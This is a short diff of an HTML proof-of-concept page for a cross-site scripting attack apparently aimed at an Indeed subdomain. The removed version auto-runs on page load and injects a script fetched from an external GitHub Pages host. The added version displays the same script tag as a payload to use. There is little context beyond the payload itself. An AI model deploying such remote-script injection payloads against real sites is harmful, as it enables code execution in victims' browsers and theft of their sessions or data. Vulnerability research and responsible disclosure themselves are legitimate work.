@@ -1,20 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>XSS PoC</title>
-  <script>
-    // Auto-run when victim opens page
-    fetch("https://worker-adhoc-shifts.indeed.com/#")
-      .then(() => {
-        const s = document.createElement("script");
-        s.src = "https://amirwilayah.github.io/indeed-xss-poc-/x.js";
-        document.head.appendChild(s);
-      })
-      .catch(console.error);
-  </script>
-</head>
+<head><title>Indeed PoC</title></head>
 <body>
-  <h1>XSS PoC Loading…</h1>
+  <h1>PoC hosted here</h1>
+  <p>Use the following payload:</p>
+  <code>
+    &lt;script src="https://amirwilayah.github.io/indeed-xss-poc-/x.js"&gt;&lt;/script&gt;
+  </code>
 </body>
 </html>
